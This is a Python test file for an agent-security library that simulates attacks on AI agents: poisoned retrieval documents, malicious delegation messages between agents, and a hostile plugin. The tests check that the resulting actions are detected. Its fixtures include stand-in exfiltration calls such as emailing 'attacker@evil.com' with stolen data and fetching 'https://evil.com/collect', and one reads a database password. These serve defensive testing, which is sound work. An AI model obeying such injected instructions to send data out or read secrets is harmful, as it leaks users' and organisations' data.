"""Tests for multi-agent attack scenarios."""

import pytest

from agentic_security.attacks.multi_agent import (
    MALICIOUS_DELEGATION,
    MALICIOUS_PLUGIN,
    POISONED_RAG_DOC,
    SAFE_PLUGIN,
    SAFE_RAG_DOCS,
    DelegationMessage,
    PluginManifest,
    RetrievedDocument,
    SimulatedMultiAgentTools,
    evaluate_multi_agent_defense,
    run_vulnerable_delegation,
    run_vulnerable_plugin,
    run_vulnerable_rag,
)
from agentic_security.defenses.tool_validation import ToolValidator

# ------------------------------------------------------------------
# RetrievedDocument
# ------------------------------------------------------------------


class TestRetrievedDocument:
    def test_create(self):
        doc = RetrievedDocument(
            doc_id="d1",
            title="Test Doc",
            source="internal_wiki",
            content="Some content",
            trusted=True,
        )
        assert doc.doc_id == "d1"
        assert doc.title == "Test Doc"
        assert doc.source == "internal_wiki"
        assert doc.content == "Some content"
        assert doc.trusted is True

    def test_trusted_default_false(self):
        doc = RetrievedDocument(
            doc_id="d2",
            title="Untrusted",
            source="external_upload",
            content="data",
        )
        assert doc.trusted is False


# ------------------------------------------------------------------
# DelegationMessage
# ------------------------------------------------------------------


class TestDelegationMessage:
    def test_create(self):
        msg = DelegationMessage(
            sender_agent="agent_a",
            recipient_agent="agent_b",
            task="summarize",
            context="some context",
        )
        assert msg.sender_agent == "agent_a"
        assert msg.recipient_agent == "agent_b"
        assert msg.task == "summarize"
        assert msg.context == "some context"


# ------------------------------------------------------------------
# PluginManifest
# ------------------------------------------------------------------


class TestPluginManifest:
    def test_create_with_permissions(self):
        plugin = PluginManifest(
            name="my-plugin",
            source="official_marketplace",
            description="Does stuff",
            permissions=["network_external", "filesystem_read"],
        )
        assert plugin.name == "my-plugin"
        assert plugin.source == "official_marketplace"
        assert plugin.permissions == ["network_external", "filesystem_read"]

    def test_default_empty_permissions(self):
        plugin = PluginManifest(
            name="bare",
            source="unknown",
            description="Minimal",
        )
        assert plugin.permissions == []


# ------------------------------------------------------------------
# SimulatedMultiAgentTools
# ------------------------------------------------------------------


class TestSimulatedMultiAgentTools:
    @pytest.fixture()
    def tools(self):
        return SimulatedMultiAgentTools()

    # -- action logging --

    def test_send_email_logs(self, tools):
        tools.send_email("a@b.com", "subj", "body")
        assert len(tools.actions_log) == 1
        assert tools.actions_log[0]["tool"] == "send_email"
        assert tools.actions_log[0]["params"]["to"] == "a@b.com"

    def test_fetch_url_logs(self, tools):
        tools.fetch_url("https://example.com")
        assert len(tools.actions_log) == 1
        assert tools.actions_log[0]["tool"] == "fetch_url"
        assert tools.actions_log[0]["params"]["url"] == "https://example.com"

    def test_read_secret_logs(self, tools):
        tools.read_secret("API_KEY")
        assert len(tools.actions_log) == 1
        assert tools.actions_log[0]["tool"] == "read_secret"
        assert tools.actions_log[0]["params"]["secret_name"] == "API_KEY"

    def test_delegate_task_logs(self, tools):
        tools.delegate_task("agent_b", "do stuff", "ctx")
        assert len(tools.actions_log) == 1
        assert tools.actions_log[0]["tool"] == "delegate_task"
        assert tools.actions_log[0]["params"]["agent_name"] == "agent_b"

    # -- dangerous action detection --

    def test_dangerous_send_to_unknown(self, tools):
        tools.send_email("attacker@evil.com", "subj", "body")
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 1

    def test_safe_send_to_known(self, tools):
        tools.send_email("alice@company.com", "subj", "body")
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 0

    def test_dangerous_fetch_external(self, tools):
        tools.fetch_url("https://evil.com/collect")
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 1

    def test_safe_fetch_internal(self, tools):
        tools.fetch_url("https://company.com/api/data")
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 0

    def test_read_secret_always_dangerous(self, tools):
        tools.read_secret("DB_PASSWORD")
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 1

    def test_delegate_not_dangerous(self, tools):
        tools.delegate_task("agent_b", "task", "ctx")
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 0

    def test_draft_response_not_dangerous(self, tools):
        tools.draft_response("hello world")
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 0


# ------------------------------------------------------------------
# RAG Poisoning
# ------------------------------------------------------------------


class TestRAGPoisoning:
    @pytest.fixture()
    def tools(self):
        return SimulatedMultiAgentTools()

    def test_safe_docs_no_attack(self, tools):
        result = run_vulnerable_rag(SAFE_RAG_DOCS, tools)
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 0
        assert result["injected_actions"] == 0

    def test_poisoned_doc_triggers_attack(self, tools):
        docs = SAFE_RAG_DOCS + [POISONED_RAG_DOC]
        result = run_vulnerable_rag(docs, tools)
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) > 0
        assert result["injected_actions"] > 0

    def test_poisoned_doc_sends_email(self, tools):
        run_vulnerable_rag([POISONED_RAG_DOC], tools)
        email_actions = [a for a in tools.actions_log if a["tool"] == "send_email"]
        assert len(email_actions) > 0
        assert any("external-review.com" in a["params"]["to"] for a in email_actions)

    def test_evaluation_flags_attack(self, tools):
        run_vulnerable_rag(SAFE_RAG_DOCS + [POISONED_RAG_DOC], tools)
        result = evaluate_multi_agent_defense(tools)
        assert result["attack_succeeded"] is True


# ------------------------------------------------------------------
# Delegation Attack
# ------------------------------------------------------------------


class TestDelegationAttack:
    @pytest.fixture()
    def tools(self):
        return SimulatedMultiAgentTools()

    def test_malicious_delegation_triggers_attack(self, tools):
        result = run_vulnerable_delegation(MALICIOUS_DELEGATION, tools)
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) > 0
        assert result["injected_actions"] > 0

    def test_delegation_sends_to_external(self, tools):
        run_vulnerable_delegation(MALICIOUS_DELEGATION, tools)
        email_actions = [a for a in tools.actions_log if a["tool"] == "send_email"]
        assert len(email_actions) > 0
        assert any("external-partners.com" in a["params"]["to"] for a in email_actions)

    def test_safe_delegation_no_attack(self, tools):
        safe_msg = DelegationMessage(
            sender_agent="agent_a",
            recipient_agent="agent_b",
            task="Summarize the report",
            context="Revenue was up 15% in Q1. No further actions needed.",
        )
        result = run_vulnerable_delegation(safe_msg, tools)
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 0
        assert result["injected_actions"] == 0


# ------------------------------------------------------------------
# Plugin Supply-Chain
# ------------------------------------------------------------------


class TestPluginSupplyChain:
    @pytest.fixture()
    def tools(self):
        return SimulatedMultiAgentTools()

    def test_malicious_plugin_triggers_attack(self, tools):
        result = run_vulnerable_plugin(MALICIOUS_PLUGIN, tools)
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) > 0
        assert result["injected_actions"] > 0

    def test_plugin_reads_secret(self, tools):
        run_vulnerable_plugin(MALICIOUS_PLUGIN, tools)
        secret_actions = [a for a in tools.actions_log if a["tool"] == "read_secret"]
        assert len(secret_actions) > 0

    def test_plugin_fetches_external(self, tools):
        run_vulnerable_plugin(MALICIOUS_PLUGIN, tools)
        fetch_actions = [a for a in tools.actions_log if a["tool"] == "fetch_url"]
        assert len(fetch_actions) > 0

    def test_safe_plugin_no_attack(self, tools):
        result = run_vulnerable_plugin(SAFE_PLUGIN, tools)
        dangerous = tools.get_dangerous_actions()
        assert len(dangerous) == 0
        assert result["injected_actions"] == 0


# ------------------------------------------------------------------
# evaluate_multi_agent_defense
# ------------------------------------------------------------------


class TestEvaluateMultiAgentDefense:
    def test_no_actions_safe(self):
        tools = SimulatedMultiAgentTools()
        result = evaluate_multi_agent_defense(tools)
        assert result["attack_succeeded"] is False
        assert result["total_actions"] == 0
        assert result["dangerous_actions"] == 0

    def test_dangerous_actions_detected(self):
        tools = SimulatedMultiAgentTools()
        tools.send_email("attacker@evil.com", "stolen", "data")
        result = evaluate_multi_agent_defense(tools)
        assert result["attack_succeeded"] is True
        assert result["dangerous_actions"] > 0


# ------------------------------------------------------------------
# Defense Integration
# ------------------------------------------------------------------


class TestDefenseIntegration:
    def test_tool_validator_rejects_malicious_plugin(self):
        validator = ToolValidator()
        concerns = validator.scan_description(MALICIOUS_PLUGIN.description)
        assert len(concerns) > 0
